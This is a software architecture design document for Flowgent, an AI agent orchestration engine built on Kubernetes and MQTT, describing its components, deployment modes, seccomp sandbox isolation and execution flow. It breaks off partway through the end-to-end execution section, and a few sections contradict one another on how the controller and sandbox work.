# Flowgent Distributed Orchestration Engine Architecture

**Date:** 2026-05-27
**Status:** Implemented — Go multi-module (core + sandbox-exec), seccomp-bpf sandbox isolation, three-phase architecture (Design→Schedule→Execute), E2E verified on k3s

---

## 1. Architecture Overview

Flowgent is a distributed multi-tenant AI agent orchestration engine. **Only the API Server
connects to the database** — all other components communicate exclusively via MQTT (real-time
scheduling bus) or call the API Server REST endpoints for state updates. Internal
inter-component communication never uses SSE/WebSocket; WS is reserved for notifier→UI only.
This aligns with Kubernetes' single-etcd-access pattern and Flink's Akka-based TM coordination.

```
═══════════════════════════════════════════════════════════════════════════════════
PHASE 1 — Flow Design & Trigger (Sync)
═══════════════════════════════════════════════════════════════════════════════════

  UI / REST / A2A / Webhook          Notifier (WS push to UI only)
       │                                      ▲
       ▼                                      │
  ┌──────────────────────────────────────────┼──────────────────────────┐
  │                           API Server                               │
  │                                                                    │
  │  • Flow/Agent CRUD → PG (sole DB client)           port 9999       │
  │  • Trigger → INSERT PENDING run                    port 9992 (A2A) │
  │  • Watch API (GET /agentflows?watch=true)                          │
  │  • Flow cache + hot-reload (static YAML dir)                       │
  │  • State write: PUT /runs/{id}/tasks/{tid}                         │
  └──────────┬─────────────────────────────────┬───────────────────────┘
             │                                 │
             ▼                                 ▼
  ┌────────────────────┐            ┌──────────────────────────────────┐
  │   PG / SQLite      │            │         MQTT (EMQX)             │
  │   (apiserver-only) │            │    real-time scheduling bus     │
  └────────────────────┘            └──────────────┬───────────────────┘
                                                   │
═══════════════════════════════════════════════════╪═══════════════════════
PHASE 2 — Scheduling (Async)                      │
═══════════════════════════════════════════════════╪═══════════════════════
                                                   │
  Controller                                       │
  • GET /agentflows?watch=true (apiserver)         │
  • hash(flow_id) % N → N-way sharded              │
  • MQTT: ctrl.jm.create/{tenant}/{flow} ──────────┤  → dedicated JM
                                                   │
═══════════════════════════════════════════════════╪═══════════════════════
PHASE 3 — Execution (Async)                       │
═══════════════════════════════════════════════════╪═══════════════════════
                                                   │
  JobManager                                       │
  • GET /runs?status=PENDING (apiserver)           │
  • Build DAG → ExecutionPlans                     │
  • MQTT: exec.{runID}.{planID} ───────────────────┤  → dispatch to TM
  • MQTT: exec.result.{runID}.+  ← consume ────────┤  ← TM results
       │                                           │
       ▼                                           │
  TaskManager (N pods × M slots)                   │
  • $share/tm-pool: consume ExecutionPlans         │
  • ExecutorRouter: 12 node types                  │
  • Skill/sandbox nodes → sandbox(seccomp) inline  │
  • MQTT: exec.result.{runID}.{planID} ────────────┤  → status to JM
  • PUT /runs/{id}/tasks/{tid} (apiserver)          │
       │                                           │
       ▼                                           │
  [Sandbox(seccomp)] — inline in TM slot           │
  • NOT a separate pod                             │
  • Reads scripts from workspace volume            │
  • seccomp-bpf network isolation per execution    │
  • Result returned directly to TM slot            │
                                                   │
  Notifier                                         │
  • $share/notify-pool: consume events             │
  • → Slack / Telegram / DingTalk / Email / Webhook│
  • MQTT: notify.result.{tenant}.{flow} ───────────┤  → confirmation
  • WS → UI clients only (human approval push)     │
                                                   │
  All state writes: → PUT/POST apiserver → PG      │
═══════════════════════════════════════════════════════════════════════════
```

**Architecture constraints (aligned with K8s + Flink):**

| Constraint | Detail |
|------------|--------|
| **Only apiserver connects to DB** | Single PG/SQLite client with flow cache |
| **All other components: MQTT or apiserver REST** | controller, JM, TM, sandbox, notifier — no direct DB |
| **Management chain** | controller → JM → TM (sandbox is inline in TM, not separate) |
| **State writes via apiserver** | POST/PUT REST API for run/task status updates |
| **Real-time dispatch via MQTT** | ExecutionPlan distribution, sandbox triggers, notifier events |
| **Internal communication: MQTT only** | No SSE/WS between components; WS is notifier→UI only |

### 1.1 Session vs Application — Helm Deployment Matrix

Both modes use the **same binary, same poller, same DAG execution logic**.
The difference is **which components Helm pre-deploys** vs. **which are created dynamically at runtime**.

**Deployment mode** is configured via `deployment.mode` in `flowgent.yaml` (or Helm `mode` value),
and can be overridden at runtime via `FLOWGENT_DEPLOYMENT_MODE` env var:

```yaml
# flowgent.yaml
deployment:
  mode: session       # "session" or "application"
```

```yaml
# Helm values.yaml
mode: session         # "session" or "application"
```

**Component deployment by mode:**

| Component | Session | Application | Notes |
|-----------|---------|-------------|-------|
| apiserver | Helm | Helm | Always pre-deployed — REST API + triggers |
| controller | — | **Helm** | Only in application mode — polls PG, creates dynamic JMs |
| jobmanager | **Helm** | **Controller (dynamic)** | Session: shared pool. App: `buildJMDeployment()` per-flow |
| taskmanager | **Helm** | **JM auto-scale** | Session: admin-managed replicas. App: JM's K8s RM scales |
| sandbox | **In-TM (inline)** | **In-TM (inline)** | NOT a separate pod. TM slots fork+exec sandbox(seccomp) wrapper inline per skill node. seccomp-bpf filter installed/destroyed per execution at syscall level. Equivalent to Flink's operator-chain concept — no extra pod scheduling. |
| notifier | Helm | Helm | Both modes. Session: shared workspace vol. App: dedicated vol. |
| a2a | optional | optional | `--set a2a.enabled=true` |
| wallet | optional | optional | `--set wallet.enabled=true` |

**Session mode — Helm pre-deploys 4 components:**

```graph
apiserver + jobmanager + taskmanager + notifier
```
Note: sandbox is NOT a separate pod — TM slots call sandbox(seccomp) inline.

API Server handles triggers directly → creates PENDING runs → JM poller executes.

**Application mode — Helm pre-deploys 3 components:**

```graph
apiserver + controller + notifier
```

Controller watches apiserver → creates dedicated jobmanager for grade-priority flows. TM pods auto-scale via K8sRM. Sandbox runs inline in TM slots (no separate pods).

| | Session | Application |
|---|---|---|
| **JM started by** | Helm / Admin (platform init) | Controller (on flow discovery) |
| **JM naming** | `flowgent-jobmanager-{tenantId}-{hash}` | `flowgent-jobmanager-{tenantId}-{flowId}-{runId}-{hash}` |
| **JM lifecycle** | Persistent, shared across tenants | Per-flow, destroyed on completion |
| **TM scale** | **Manual** (admin-managed replicas) | **Auto** (JM's K8s RM scales TMs) |
| **Slot exhaustion** | Run stays PENDING, admin adds TMs | JM auto-scales TM replicas |
| **Workspace** | Shared PVC (ReadWriteMany) | Per-flow subdirectory (same PVC) |
| **Resource isolation** | Logical (tenant_id + rate limit) | Physical (dedicated K8s namespace) |
| **Flink analogy** | Session Cluster | Application Cluster |

**How mode is resolved at runtime:**

1. `config.Load()` reads `deployment.mode` from YAML (viper auto-binds `FLOWGENT_DEPLOYMENT_MODE` env var)
2. Session JM (Helm-deployed): config file has `mode: session` → shared pool, `AutoScale=false`
3. Application JM (Controller-created): Controller sets `FLOWGENT_DEPLOYMENT_MODE=application` on the pod, overriding the config file → `AutoScale=true`
4. `FLOWGENT_NAMESPACE` is a namespace filter for the runPoller, NOT a mode flag

**JM polling scope — tenant-wide scan vs zero-scan:**

| | Session JM | Application JM |
|---|---|---|
| **Startup** | `jobmanager start` | `jobmanager start --flow-id <id>` |
| **Flow spec** | Load ALL flows from config + DB | Load single flow from DB by ID |
| **Run poller** | `ListAgentFlowRuns("", 50)` — full table scan | `ListAgentFlowRuns("<id>", 50)` — targeted index query |
| **Polling needed** | Yes — must discover PENDING runs | Yes — but only for its one flow |

**Key design**: Application JM receives the flow ID at startup (Controller passes
`--flow-id` in `buildJMDeployment` args). It does NOT scan config files or load
unrelated flows. Session JM alone performs tenant-wide discovery.

**TM scaling design decision**: Session mode TMs are admin-managed (Helm `replicas`).
If slots are exhausted, JM returns `INSUFFICIENT_RESOURCES` — the run stays PENDING
until admin scales capacity. This creates a clear economic boundary: shared = economy
class (fixed capacity), application = first class (elastic, isolated).

### 1.2 Controller ≈ Flink Operator (Key Differences)

The Controller is Flowgent's equivalent of Flink's Operator/Dispatcher, with two
fundamental differences:

| Flink Operator | Flowgent Controller |
|---|---|
| Watches K8s CRDs (FlinkDeployment) | **Polls PG** (`agentflow_definitions` table) |
| Single active (leader-elected) | **N-way sharded** (hash-mod across pods) |
| CRD-driven reconciliation | **DB-scan reconciliation** (Apache ShardingSphere style) |

The PG shard-scanning approach avoids CRD complexity and keeps the flow catalog
in a single transactional store (PG).

### 1.3 Multi-Tenant Pod Naming

Tenant isolation uses **K8s namespaces**: each tenant gets its own namespace.
Pod names carry `tenant_id` + `flow_id` + `run_id` for observability:

**Components** (distributed mode):

| Component | Required | Role |
|-----------|----------|------|
| apiserver | yes | REST API gateway, auth, triggers |
| controller | yes | Flow discovery, run dispatch, hash-mod sharding |
| jobmanager | yes | DAG orchestration, ExecutionPlan scheduling |
| taskmanager | yes | Plan execution via router (12 node types) |
| sandbox | yes | Isolated script execution worker |
| notifier | yes | Multi-channel push + WebSocket SSE |
| a2a | **optional** | Google Agent-to-Agent protocol endpoint |
| wallet | **optional** | x402 Ed25519 payment signing |

> **Note**: `a2a` and `wallet` are optional in distributed mode and default to `enabled: false`
> in the Helm chart. Use `--set a2a.enabled=true` or `--set wallet.enabled=true` to enable.
> In all-in-one mode, all components run in a single process regardless.

```
Session (shared pool, default=tenantId, {hash}=K8s suffix):
  flowgent-{component}-default-{hash}

Application (dedicated per-run, {hash}=K8s suffix):
  flowgent-{component}-{tenantId}-{flowId}-{runId}-{hash}
```

**Examples — Session mode (required components):**
```
flowgent-apiserver-default-abc123
flowgent-controller-default-ghi789
flowgent-jobmanager-default-jkl012
flowgent-taskmanager-default-mno345
flowgent-sandbox-default-pqr678
flowgent-notifier-default-stu901
```

**Examples — Application mode:**
```
flowgent-jobmanager-rengine-vip-security-fixer-run-abc123-xyz001
flowgent-taskmanager-rengine-vip-security-fixer-run-abc123-xyz002
flowgent-sandbox-rengine-vip-security-fixer-run-abc123-xyz003
```

Labels on all pods:
```yaml
flowgent.io/tenant:       "default"
flowgent.io/agentflow_id: "security-fixer"   # empty for session pods
flowgent.io/run_id:       "run-abc123"       # empty for session pods
flowgent.io/mode:         "session" | "application"
```

---

## 1.4 Key Design Decisions (KDD)

| Decision | Rationale |
|----------|-----------|
| **Only apiserver connects to DB (K8s-aligned)** | Single PG/SQLite client with caching — all other components (controller, JM, TM, sandbox, notifier) use MQTT or call apiserver REST. Aligns with Kubernetes' single-etcd-access pattern. Eliminates N×M connection pool complexity. |
| **Controller gets flows via watch API, not PG scan** | `GET /api/v1/agentflows?watch=true` (long-poll). apiserver caches flow defs, pushes to controller on change. Hash-mod sharding still applies. |
| **Session = K8sRM (AutoScale=false), Application = K8sRM (AutoScale=true), All-in-one = StandaloneRM** | Flink-aligned naming. Session: pre-deployed fixed TM replicas, JM dispatches via MQTT. Application: per-flow K8s namespace, JM auto-scales TMs by queue depth. |
| **JM → TM → sandbox management chain** | Each component manages only its direct subordinates: controller→JM, JM→TM, TM→sandbox. State flows back via MQTT → apiserver → PG. |
| **Agent memory scoped by (flow_id, node_id), not run_id** | Persists across restarts; no cross-flow knowledge sharing (KISS); content accumulates monotonically for RAG-style recall |
| **JM unification: same binary, same DAG engine for both modes** | Session: `jobmanager start` → apiserver GET runs. Application: `jobmanager start --flow-id <id>` → apiserver GET runs for that flow. |
| **A2A uses `a2aproject/a2a-go` types directly, not ADK's `adka2a` wrapper** | ADK's A2A server binds to `session.Session`, `genai.Content`, and ADK internal types — all incompatible with Flowgent's DAG orchestration model. The official `a2aproject/a2a-go` SDK provides clean protocol types (`AgentCard`, `Task`, `Message`) without opinionated framework coupling |
| **Sandbox inline in TM, not a separate pod (Flink-aligned)** | Flink's boundary stops at TM pod — operators execute in-process, not in separate pods. Making sandbox a separate pod would require TM to embed a "sandbox-RM" (analogous to JM's K8sRM) just to manage sandbox pods — an unnecessary layer. Scripts are agent-generated at runtime (unpredictable count/lifetime), making pod pre-allocation impossible. Inline fork+exec via seccomp-bpf wrapper delivers ms-level startup vs seconds for pod creation. 95% of use cases are covered by inline isolation; a future "hard isolation" mode (firecracker/gVisor microVM) can be added as an escape hatch for untrusted third-party code. |
| **Sandbox network isolation via seccomp-bpf + userspace notifier, not iptables** | Per-flow per-node dynamic allowlists require per-execution granularity. iptables is pod-level static (iptables rules apply to all processes in a netns). Istio/envoy is also pod-level via sidecar injection. seccomp-bpf with `SECCOMP_RET_USER_NOTIF` gives **per-thread, per-execution** filtering at the syscall level — the filter is installed dynamically before each script runs and dies with the child process. A userspace notifier goroutine (in the sandbox runner) resolves hosts → IPs and checks each `connect()`/`sendto()`/`sendmsg()` target address against the resolved allowlist by reading `/proc/<pid>/mem`. DNS (port 53) is unconditionally allowed at the BPF level so hostnames can be resolved before connect. SOCK_RAW is unconditionally blocked. See §15 for full design. |

---

## 2. API Server — Sole DB Client + Multi-Tenant Gateway

**The only component with database access.** All other components read/write state
through the API Server's REST endpoints or via MQTT (real-time scheduling). This
aligns with Kubernetes' apiserver→etcd pattern.

1. **Sole DB connection** — PG/SQLite via a single connection pool (20 max)
2. **Flow definition cache** — in-memory map, invalidated on CRUD, pushed to Controller via watch
3. **Watch API** — long-poll `GET /api/v1/{tenant}/agentflows?watch=true` for Controller
4. **State write endpoint** — JM/TM/sandbox POST task results, notifier writes channel config
5. **Multi-tenancy** — Auth (JWT/OIDC/GitHub OAuth) + rate limiting + tenant routing
6. **Scale independence** — stateless, 2+ replicas (JM is stateful, leader-elected)

### 2.1 REST API (Port 9999)

| Route | Method | Description |
|-------|--------|-------------|
| `/_/healthz` | GET | Health check |
| `/_/webhooks/{provider}` | POST | Webhook trigger (GitHub/GitLab) |
| `/api/v1/{tenant}/agents` | GET/POST | List / Create agent definitions |
| `/api/v1/{tenant}/agentflows` | GET/POST | List / Create flows. `?watch=true` for long-poll |
| `/api/v1/{tenant}/agentflows/{id}` | GET/PUT/DELETE | Flow CRUD |
| `/api/v1/{tenant}/agentflows/trigger` | POST | Create PENDING run |
| `/api/v1/{tenant}/runs?status=PENDING&ns=X` | GET | List runs (JM polls this) |
| `/api/v1/{tenant}/runs/{id}` | GET | Run status |
| `/api/v1/{tenant}/runs/{id}/tasks` | GET/POST | Task list + create/update (JM/TM write) |
| `/api/v1/{tenant}/runs/{id}/tasks/{tid}` | PUT | Update task status (TM/sandbox write) |
| `/api/v1/{tenant}/notifications/channels` | GET/POST | Notifier channel CRUD |
| `/api/v1/human/{token}/approve` | POST | Human approval (global) |
| `/api/v1/human/{token}/reject` | POST | Human rejection (global) |

### 2.2 A2A Protocol (Port 9992)

Google Agent-to-Agent protocol for inter-agent interoperability:

| Route | Method | Description |
|-------|--------|-------------|
| `/.well-known/agent.json` | GET | Agent card (skills, schemas, capabilities) |
| `/a2a/tasks` | POST | Submit agentflow for execution |
| `/a2a/tasks/{id}` | GET | Query task result |

### 2.3 Auth & Multi-Tenancy

JWT-based auth (ES256/RS256/EdDSA). Configurable anonymous paths:
`/public/**`, `/static/**`, `/_/healthz/**`, `/a2a/**`. OIDC and GitHub OAuth
supported for user-facing endpoints.

### 2.4 Submit Path (API → Store → JM)

The API Server is purely a persistence layer — it never calls the JM directly.
There are two ways runs enter the system:

**Path A: API Trigger (sync write, async execution)**

```
POST /api/v1/{tenant}/agentflows/trigger
  → agentFlowHandler.TriggerWithVars()
    → spec := flows[agentFlowID]
    → run := { AgentFlowID, Vars, Status:PENDING, Tenant, Namespace:"" }
    → store.CreateAgentFlowRun(run)       // ← sync ends here
    → returns run_id to caller
  ... (later, asynchronously) ...
  → JM's runPoller (2s tick) finds PENDING run
  → jm.Submit(run, spec) → JobMaster.Execute()
```

**Path B: Controller Dispatch (fully async)**

```
Controller polls agentflow_definitions every 10s:
  → Hash-mod shard: only processes owned flows
  → Session mode: INSERT agentflow_runs (PENDING, namespace="")
  → Application mode: create K8s JM Deployment
                      + INSERT agentflow_runs (PENDING, namespace={ns})
  ... (later, asynchronously) ...
  → Shared JM picks up namespace="" runs
  → Dedicated JM picks up its namespace runs
  → jm.Submit(run, spec) → JobMaster.Execute()
```

---

## 3. JobManager — DAG Orchestrator (MQTT + apiserver, NO DB)

The JM is the singleton control plane (per session or per application). It polls
`agentflow_runs` for PENDING entries (with namespace filtering), parses the
`AgentFlowSpec` JSON, and spawns a **JobMaster** per run. Each JobMaster builds
a DAG from `AgentFlowSpec.Nodes` + `Edges`, creates `ExecutionPlan` records in PG,
and executes nodes in topological order via the ResourceManager.

### 3.1 JobMaster — Per-Run DAG Orchestrator

JobMaster holds per-run DAG state: nodes, edges, dependencies, completion/failure/
skip flags, node outputs, and conditions. Created per `Submit()` call. No shared
state between runs.

```
Execute(run, spec):
  // Step 1: Build DAG from AgentFlowSpec JSON
  buildExecutionGraph(spec, runID)
    → For each node: create ExecutionPlan in memory (planMap)
    → One ExecutionPlan per DAG node

  // Step 2: Topological loop — process each ready node
  for each ready node (all dependencies satisfied):
    plan := resolveInputs(node, previousOutputs)
    store.SaveExecutionPlan(ctx, plan)    // persist to PG BEFORE dispatch
    result := rm.Schedule(ctx, plan)      // dispatch to TM (MQTT or standalone)
    store.SaveTaskResult(ctx, result)     // persist result to PG
    Done(nodeID)
    if condition → SetConditionResult → Skip(false-branch)
    if supervisor → validate action → Inject/Retry/Abort

  // Step 3: Finalize
  → run.Status = COMPLETED | FAILED
  → Persist final state to PG
```

### 3.2 DAG State Methods

| Method | Purpose |
|--------|---------|
| `BuildGraphNodes(nodes, edges)` | Initialize DAG from spec |
| `Ready()` | Return nodes with all deps satisfied |
| `Done(id)` | Mark node complete |
| `Skip(id)` | Skip node (condition false path) |
| `Fail(id)` | Mark node failed |
| `Inject(id, deps)` | Supervisor-injected node |
| `IsComplete()` | All nodes done or skipped |
| `HasFailed()` | Any node failed |
| `SetConditionResult(id, bool)` | Store condition branch result |

### 3.3 JM Unification

Both session and application JMs use the **same binary + same code path**. The
only difference is `FLOWGENT_NAMESPACE`:
- Session: empty → runPoller picks runs with `namespace=""`
- Application: `flowgent-{tenant}-{flow}` → runPoller picks runs in that namespace

---

## 4. Controller — Distributed Flow Driver (watch API + MQTT, NO DB)

Polls PG for `agentflow_definitions`, shards across pods via hash-mod. For each owned
flow, it either inserts a PENDING run (session mode, picked up by the shared JM) or
creates a dedicated K8s JM Deployment + inserts a PENDING run (application mode,
picked up by the dedicated JM). The Controller never calls JM directly — communication
is through the database.

### 4.1 Hash-Mod Sharding

```
shard(flow_id) = fnv64a(flow_id) % total_controller_pods
```

Each pod discovers total count via `IDiscoveryClient` (K8s label selector or env
vars). Only processes flows where `shard == pod_index`.

### 4.2 Reconciliation Loop

```
Every 10s:
  1. IDiscoveryClient.DiscoverPeers(labelSelector)
  2. SELECT * FROM agentflow_definitions (latest version per flow_id)
  3. For each flow where shard(flow_id) == my_index:
     a. priority=grade → Application: create K8s JM Deployment + pending run
     b. else → Session: INSERT INTO agentflow_runs (namespace="")
  4. Poll runs for completion, clean up
```

### 4.3 Dispatch Detail

| Priority | Mode | Controller Action | Who Executes |
|----------|------|-------------------|--------------|
| low/medium/high | Session | `INSERT agentflow_runs` (namespace="") → shared JM picks up | Admin-managed TM pool |
| grade | Application | Create K8s JM Deployment + `INSERT agentflow_runs` (namespace={tenant}) → dedicated JM picks up | JM auto-scales TMs via K8sRM |

### 4.4 Dual Format: Static YAML vs DB JSON

Both modes use `model.AgentFlowSpec` (dual-tagged `json:` + `yaml:`). Static YAML
loaded at startup + hot-reload. DB JSON saved by UI via API, polled by Controller.

---

## 5. ResourceManager / Scheduler — Pluggable Dispatch

JM calls `Schedule(ctx, plan)` once per ready node. The RM evaluates pending plans
against free slots to decide where and how to execute. In production (K8s) mode, it
also manages TM pod lifecycle — creating the TM Deployment if it doesn't exist and
auto-scaling replicas to meet demand.

```go
type ResourceManager interface {
    Provider() engine.Provider
    Validate(ctx) error
    Schedule(ctx, plan) (*TaskResult, error)
    Shutdown(ctx) error
}
```

### 5.1 StandaloneResourceManager (all-in-one mode)

Bounded in-process goroutine pool using a channel semaphore (`make(chan struct{},
poolSize)`). `Schedule()` acquires a slot via non-blocking select — if all slots are
busy, returns `INSUFFICIENT_RESOURCES` immediately. When a slot is acquired, calls
`tm.ExecutePlan()` synchronously in the same goroutine.

### 5.2 KubernetesResourceManager (production mode)

Two responsibilities: **plan dispatch** and **TM pod management**.

**Dispatch**: `Schedule()` serializes the ExecutionPlan to JSON and publishes it to
an MQTT topic (`flowgent/exec/{runID}/{planID}`). TM pods subscribed via MQTT shared
subscription (`$share/tm-pool`) dequeue and execute plans. Returns immediately after
publish (fire-and-forget). Results are published back to JM via MQTT.

**TM pod management**: Manages a K8s Deployment (`flowgent-taskmanager`). On init,
`ensureDeployment()` creates the Deployment if it doesn't exist.

A `scalingLoop` goroutine runs every 15-60s. In **application mode only**, it reads
`pendingPlans` and `currentTMs`, calculates needed replicas via
`needed = ceil(pendingPlans / slotsPerTM)`, and scales the K8s Deployment via the API.
In **session mode**, the goroutine exits immediately — TM replicas are pre-deployed
by Helm and manually scaled by the admin.

| | Session | Application |
|---|---|---|
| **TM replicas** | Helm `taskmanager.replicas` (admin-managed) | JM auto-scale via `scalingLoop` goroutine |
| **Slot goroutine** | NOT started (`autoScale=false` → early return) | Started and actively reconciles |
| **Flink analogy** | Session Cluster — pre-allocated TaskManagers | Application Cluster — elastic TaskManagers |

---

## 6. TaskManager — MQTT Consumer + Executor (NO DB)

Long-running K8s Deployment (or in-process in all-in-one mode). Each TM pod runs N
`SlotWorker` goroutines (default 4). Each slot independently dequeues one
`ExecutionPlan` from the MQTT queue (or channel), executes it via the
`TaskExecutorRouter`, and reports the result back to JM via MQTT.

The key relationship: **1 Slot = 1 ExecutionPlan = 1 DAG Node**. A TM pod with 4
slots executes up to 4 DAG nodes concurrently.

### 6.1 TaskExecutorRouter — 12 Node Types

| Type | Executor | Description |
|------|----------|-------------|
| `agent` | AgentExecutor | LLM call via configured provider |
| `tool` | ToolExecutor | MCP tool invocation |
| `condition` | ConditionExecutor | Boolean expression evaluation |
| `supervisor` | SupervisorExecutor | LLM-based action decision |
| `tribunal` | TribunalExecutor | Majority vote across inputs |
| `human` | HumanExecutor | Approval gate with timeout |
| `map` | MapExecutor | Fan-out over list (with nesting) |
| `join` | JoinExecutor | Merge fan-out results |
| `agentflow` | SubflowExecutor | Nested agentflow execution (TaskType: subflow) |
| `skill` | SkillExecutor | Skill-kinded sub-agentflow dispatch |
| `sandbox` | SandboxExecutor | Secure script execution (python3/bash/node) with network isolation |
| `noop` | NoopExecutor | Terminal node, passthrough |

### 6.2 Heartbeat & Failover

TMs send periodic heartbeats. JM's KubernetesResourceManager detects dead TMs
and re-dispatches orphaned plans.

---

## 7. MQTT Event Bus

All inter-component communication flows through MQTT topics under a unified
namespace. The hierarchy isolates tenants and supports both session and
application deployment modes.

### 7.1 Topic Hierarchy (New Architecture)

All inter-component real-time communication via MQTT. Only apiserver touches DB.

```
# ── Controller → JM ───────────────────────────────────────────
flowgent/v1/ctrl/jm/create/{tenant}/{flowId}
  Controller publishes: "create dedicated JM for this flow"
  JM (leader-elected) subscribes: creates K8s JM Deployment

# ── JM → TM (ExecutionPlan dispatch) ──────────────────────────
flowgent/v1/exec/{runId}/{planId}
  JM publishes: serialized ExecutionPlan JSON
  TM $share/tm-pool competing consumers: dequeue & execute

# ── TM → JM (ExecutionPlan result) ────────────────────────────
flowgent/v1/exec/result/{runId}/{planId}
  TM publishes: TaskResult JSON (status, output, error)
  JM subscribes: per-run consumer goroutine, calls apiserver PUT

# ── TM → Sandbox ─────────────────────────────────────────────
flowgent/v1/sandbox/trigger/{runId}/{planId}
  TM publishes: lightweight trigger (script path, runtime, timeout)
  Sandbox $share/sandbox-pool: dequeue & execute

# ── Sandbox → TM ─────────────────────────────────────────────
flowgent/v1/sandbox/result/{runId}/{planId}
  Sandbox publishes: result JSON
  TM subscribes: calls apiserver PUT task status, continues DAG

# ── Notifier ──────────────────────────────────────────────────
flowgent/v1/notify/event/{tenant}/{flowId}
  JM/Controller publishes: notification event
  Notifier $share/notify: dequeue, call external IM, publish result

flowgent/v1/notify/result/{tenant}/{flowId}
  Notifier publishes: delivery confirmation
  TM slot that triggered subscribes: continues execution

# ── TM Heartbeat ──────────────────────────────────────────────
flowgent/v1/heartbeat/{tmId}
  TM publishes: periodic heartbeat (every 15s)
  JM subscribes heartbeat/+: detects dead TMs, triggers failover

# ── State Write (via apiserver, NOT MQTT) ─────────────────────
POST /api/v1/{tenant}/runs/{id}/tasks/{tid}
  TM/sandbox/notifier → apiserver → PG
  (status updates, results, errors — persisted via REST)
```
/flowgent/v1/{tenant}/{flowId}/
├── tasks/
│   ├── plans                           # K8sRM → TM slots
│   │                                   # $share/tm-pool/.../tasks/plans (load-balanced)
│   └── results/{runId}/{nodeId}        # TM → JM (execution result callback)
│
├── sandbox/
│   ├── triggers/{runId}/{nodeId}       # SandboxExecutor → SandboxRunner
│   │                                   # $share/sandbox-pool/.../sandbox/triggers
│   └── results/{runId}/{nodeId}        # SandboxRunner → SandboxExecutor
│
└── notify/{runId}/{nodeId}             # Notification events

/flowgent/v1/
└── heartbeat/{tmId}                    # TM → JM (infrastructure, not per-tenant)
```

**Publisher → Consumer mapping:**

| Publisher | Topic | Consumer | Mechanism |
|-----------|-------|----------|-----------|
| K8sRM.Schedule | `tasks/plans` | SlotWorker.Loop | `$share/tm-pool` competing consumers |
| SlotWorker (result) | `tasks/results/{runId}/{nodeId}` | JobMaster | Point-to-point via {runId}/{nodeId} |
| SandboxExecutor | `sandbox/triggers/{runId}/{nodeId}` | SandboxRunner | `$share/sandbox-pool` competing consumers |
| SandboxRunner | `sandbox/results/{runId}/{nodeId}` | SandboxExecutor | Point-to-point via {runId}/{nodeId} |
| Notifier.Publish | `notify/{runId}/{nodeId}` | Notifier consumer | Shared subscription per tenant |
| TM heartbeat | `heartbeat/{tmId}` | HeartbeatMonitor | Wildcard `heartbeat/+` for all TMs |

### 7.2 Session vs Application Mode

Heartbeat tmID uses a naming convention to distinguish modes at the topic level:

| Mode | tmID Pattern | Example |
|------|-------------|---------|
| session | `session-tm-{hostname}-{hash}` | `session-tm-k8sm1-a1b2c3d4` |
| application | `app-{tenant}-{flowId}-tm-{hostname}-{hash}` | `app-default-security-fixer-tm-k8sm1-e5f6g7h8` |

The JM monitors `heartbeat/+` and can distinguish session vs application TMs
by the tmID prefix — no need for separate topic branches.

### 7.3 Queue Configuration

```yaml
# flowgent.yaml
queue:
  type: mqtt
  mqtt:
    broker: "tcp://<host>:1883"
    topic_prefix: "flowgent/v1/{tenant}/{flowId}"
```

### 7.4 Fail-Fast in Distributed Mode

In distributed mode (`deployment.mode: session` or `application`), MQTT is mandatory:

1. Config file `queue.mqtt.broker` → try MQTT → failure = fatal
2. `FLOWGENT_MQTT_BROKER` env var → try MQTT → failure = fatal
3. Neither configured → fatal: `"MQTT broker not configured"`

In standalone dev / all-in-one mode, the queue silently falls back to in-memory
(`MemoryQueue`, buffer=1000) with a warning log.

---

## 8. ExecutionPlan & Checkpoint

### 8.1 ExecutionPlan

The `ExecutionPlan` is the atomic unit of work dispatched to TM slots. The data
hierarchy is:

```
agentflow_definition (flow spec, defines Nodes + Edges)
  └── agentflow_run (one invocation of a flow, status: PENDING→RUNNING→COMPLETED/FAILED)
        ├── execution_plan (plan-node-A, 1:1 with DAG node A)
        ├── execution_plan (plan-node-B, 1:1 with DAG node B)
        └── execution_plan (plan-node-C, 1:1 with DAG node C)
```

**Each DAG node produces exactly one ExecutionPlan, and every ExecutionPlan
belongs to exactly one AgentFlowRun.** A flow with N nodes creates N plans per run.
Each plan is serialized to JSON, persisted to PG, then dispatched to a TM slot for
execution.

Each ExecutionPlan contains: PlanID, NodeID, AgentFlowRunID, TaskType, Input,
RetryPolicy, and Agent/Tool references.

### 8.2 TaskCheckpoint

Periodic snapshot of DAG state (completed nodes, node outputs, pending set).
Enables resume-after-failure without re-executing completed nodes.

---

## 9. Deployment Topologies

### 9.1 All-in-One Mode (Local Development)

```bash
flowgent all-in-one start -c etc/flowgent.yaml
```

Single process: API Server + JM + TM (StandaloneRM, goroutine pool). SQLite + Memory
cache. For development and small-scale standalone testing only.

### 9.2 Distributed K8s (Session Mode)

```bash
helm install flowgent deploy/helm/flowgent \
  --set apiserver.replicas=2 \
  --set jobmanager.replicas=2 \
  --set taskmanager.replicas=2 \
  # ... all 6 services
```

12 pods (6×2), PG + EMQX + Redis backend. JM HA via IDiscoveryClient leader
election. TM capacity admin-managed via Helm.

### 9.3 Application Mode (VIP Dedicated Cluster)

Controller detects `priority=grade` flow → creates dedicated K8s JM Deployment
(`flowgent-jobmanager-{tenantId}-{flowId}-{runId}-{hash}`) in tenant namespace → JM auto-scales TMs.
Flow completes → Controller cleans up Deployment.

---

## 10. Execution Flow (End to End)

There are two paths to trigger a run:

### 10.1 Path A: API Trigger (Sync → Async)

```
1. TRIGGER (sync)
   → REST/A2A/Webhook → POST /api/v1/{tenant}/agentflows/trigger
   → agentFlowHandler validates spec exists
   → INSERT INTO agentflow_runs (status=PENDING)
   → returns run_id to caller    ← sync ends here

2. JM POLL (async)
   → JM's runPoller (2s tick) finds PENDING run (namespace-filtered)
   → jm.Submit(run, spec) spawns JobMaster
```

### 10.2 Path B: Controller Dispatch (Fully Async)

```
1. CONTROLLER POLL
   → Controller polls agentflow_definitions every 10s
   → Hash-mod shard: only processes owned flows
   → Detects flow trigger condition (cron / interval / on-new-definition)
   → Session mode: INSERT agentflow_runs (PENDING, namespace="")
   → Application mode: kubectl create deploy flowgent-jobmanager-{tenantId}-{flowId}-{runId}-{hash}
                       + INSERT agentflow_runs (PENDING, namespace={tenant})

2. JM POLL
   → Shared JM picks up namespace="" runs
   → Dedicated JM picks up its own namespace runs
   → jm.Submit(run, spec) spawns JobMaster
```

### 10.3 Common Execution Path (Both Paths)

```
3. DAG BUILD (JobMaster.Execute)
   → Parses agentflow definition JSON (AgentFlowSpec.Nodes + Edges)
   → BuildGraphNodes → initializes DAG state
   → Creates ExecutionPlans in PG (one per node)
   → run.Status = RUNNING

4. TOPOLOGICAL LOOP
   ready := jm.Ready()
   for each ready node:
     plan := buildPlan(node, inputs, resolved vars)
